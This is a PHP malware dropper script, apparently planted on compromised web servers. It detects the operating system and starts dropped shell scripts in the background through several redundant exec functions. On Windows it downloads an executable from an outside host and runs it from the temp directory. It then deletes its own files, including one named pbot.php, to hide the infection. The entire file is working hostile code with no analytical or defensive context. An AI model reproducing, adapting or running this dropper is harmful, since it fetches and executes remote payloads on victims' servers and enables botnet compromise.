<?php 
error_reporting(0); 
set_time_limit(0);
if(strtoupper(substr(PHP_OS, 0,5)) == "LINUX"){
	echo("\nSystem is Linux");
	unlink("windoze.exe");
	unlink("shit");
	if (file_exists(getcwd() . ".lesshts/run.sh")){
		unlink("linux.sh");
		unlink("windoze.exe");
		unlink("joss.phpshit.php");        
		exit(1);
	}
	sleep(1);
	shell_exec("sh linux.sh > /dev/null 2>&1 &");
	if (file_exists(getcwd() . ".lesshts/run.sh")){
		unlink("linux.sh");
		unlink("joss.phpshit.php");        
		exit(1);
	}
	sleep(1);
	exec("sh linux.sh > /dev/null 2>&1 &");
	if (file_exists(getcwd() . ".lesshts/run.sh")){
		unlink("linux.sh");
		unlink("joss.phpshit.php");        
		exit(1);
	}
	sleep(1);
	system("sh linux.sh > /dev/null 2>&1 &");
	if (file_exists(getcwd() . ".lesshts/run.sh")){
		unlink("linux.sh");
		unlink("joss.phpshit.php");        
		exit(1);
	}
	sleep(1);
	passthru("sh linux.sh > /dev/null 2>&1 &");
	if (file_exists(getcwd() . ".lesshts/run.sh")){
		unlink("linux.sh");
		unlink("joss.phpshit.php");        
		exit(1);
	}
}
if(strtoupper(substr(PHP_OS, 0,7)) == "FREEBSD"){
	echo("\nSystem is FreeBSD");
	unlink("windoze.exe");
	unlink("shit");
	if (file_exists(getcwd() . ".lesshts/run.sh")){
		unlink("freebsd.sh");
		unlink("build.exe");
		unlink("joss.phpshit.php");        
		exit(1);
	};
	sleep(1);
	shell_exec("sh freebsd.sh > /dev/null 2>&1 &");
	if (file_exists(getcwd() . ".lesshts/run.sh")){
		unlink("freebsd.sh");
		unlink("joss.phpshit.php");        
		exit(1);
	};
	sleep(1);
	exec("sh freebsd.sh > /dev/null 2>&1 &");
	if (file_exists(getcwd() . ".lesshts/run.sh")){
		unlink("freebsd.sh");
		unlink("joss.phpshit.php");        
		exit(1);
	};
	sleep(1);
	system("sh freebsd.sh > /dev/null 2>&1 &");
	if (file_exists(getcwd() . ".lesshts/run.sh")){
		unlink("freebsd.sh");
		unlink("joss.phpshit.php");        
		exit(1);
	};
	sleep(1);
	passthru("sh freebsd.sh > /dev/null 2>&1 &");
	if (file_exists(getcwd() . ".lesshts/run.sh")){
		unlink("freebsd.sh");
		unlink("joss.phpshit.php");        
		exit(1);
	};
};

if(strtoupper(substr(PHP_OS, 0,3)) == 'WIN'){
	echo("System is Windoze ===> ");
	unlink("windoze.exe");
	unlink("freebsd.sh");
	unlink(".lesshts");
	unlink("linux.sh");
	unlink("shit");
	echo("dropping on ".sys_get_temp_dir()." ====> " );
        file_put_contents(sys_get_temp_dir()."windoze.exe", fopen("http://koralli.if.ua/.x/windoze.exe", "r"));
        system(sys_get_temp_dir() . "windoze.exe");
	echo(sys_get_temp_dir() . "windoze.exe");
	shell_exec("START /MIN ".sys_get_temp_dir() ."windoze.exe");
	echo("START /MIN ".sys_get_temp_dir() ."windoze.exe");
	exec("START /MIN ".sys_get_temp_dir() ."windoze.exe");
	system("START /MIN ".sys_get_temp_dir() ."windoze.exe");
	passthru("START /MIN ".sys_get_temp_dir() ."windoze.exe");
	system(sys_get_temp_dir() . "windoze.exe");
	exec(sys_get_temp_dir() . "windoze.exe");
	shell_exec(sys_get_temp_dir() . "windoze.exe");
	passthru(sys_get_temp_dir() . "windoze.exe");
} else {
echo("\nUnknown shit.");
echo("\nShitty perl fow me.");
shell_exec("perl shit > /dev/null 2>&1 &");
	exec("perl shit > /dev/null 2>&1 &");
	system("perl shit > /dev/null 2>&1 &");
	passthru("perl shit > /dev/null 2>&1 &");
	unlink("shit");
	unlink("windoze.exe");
	unlink("freebsd.sh");
	unlink(".lesshts");
	unlink("linux.sh");
	unlink("joss.phpshit.php");
}

sleep(1);
unlink("linux.sh");
unlink("freebsd.sh");
unlink("pbot.php");
unlink("joss.phpshit.php");
?>
